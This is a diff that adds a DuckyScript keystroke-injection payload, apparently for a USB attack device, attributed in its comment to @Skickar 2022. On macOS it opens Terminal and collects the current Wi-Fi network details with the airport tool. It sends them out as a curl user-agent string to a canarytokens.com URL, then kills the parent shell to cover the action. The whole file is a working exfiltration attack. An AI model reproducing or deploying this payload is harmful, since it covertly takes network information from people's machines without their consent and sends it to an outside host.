@@ -1,0 +1,8 @@
+REM Wi-Fi Network setting exfil, takes current network information & sends it as user agent to a canary token, by @Skickar 2022
+GUI SPACE
+STRING terminal.app
+ENTER
+DELAY 2000
+STRING curl --silent --output /dev/null --user-agent $(airport --getinfo | sed 1d | xargs | tr -d ' ' | tr -d '-') http://canarytokens.com/terms/tags/9sh0p7if7ei3j6z9mfwvrt9d9/post.js && wait && kill -9 $(ps -p $PPID -o ppid=)
+DELAY 500
+ENTER
